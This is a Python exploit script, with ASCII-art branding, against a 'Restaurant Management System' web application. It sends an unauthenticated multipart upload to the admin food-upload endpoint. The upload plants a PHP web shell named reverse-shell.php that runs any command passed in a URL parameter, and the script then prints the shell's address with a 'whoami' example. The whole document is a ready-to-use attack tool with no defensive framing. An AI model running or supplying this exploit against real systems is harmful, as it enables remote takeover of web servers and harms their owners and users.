#!/usr/bin/python

import requests
import sys

print(r"""
  ╔══════════════╗
  ║   🤖 RMS    ║
  ║   EXPLOIT   ║
  ╚══════════════╝
     /       \
    / (o) (o) \
   /    ▽     \
  /____________\
""")

if len(sys.argv) < 2:
    print("[+] Usage : python rms-rce.py http://localhost:80/")
    exit()

url = sys.argv[1]

if len(url) < 8:
    print("[+] Usage : python rms-rce.py http://localhost:80/")
    exit()

print("[+] Restaurant Management System Exploit, Uploading Shell")

target = url + "admin/foods-exec.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------191691572411478",
    "Connection": "close",
    "Referer": url + "admin/foods.php",
    "Upgrade-Insecure-Requests": "1"
}

data = """-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="reverse-shell.php"
Content-Type: text/html

<?php echo shell_exec($_GET["cmd"]); ?>
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--
"""

print("[+] Sending exploit to: " + target)
try:
    r = requests.post(target, verify=False, headers=headers, data=data)
    
    if r.status_code == 200:
        print("[+] Shell Uploaded. Please check the URL: " + url + "images/reverse-shell.php")
        print("[+] Example: " + url + "images/reverse-shell.php?cmd=whoami")
    else:
        print("[-] Exploit failed. Status code: " + str(r.status_code))
        
except Exception as e:
    print("[-] Error: " + str(e))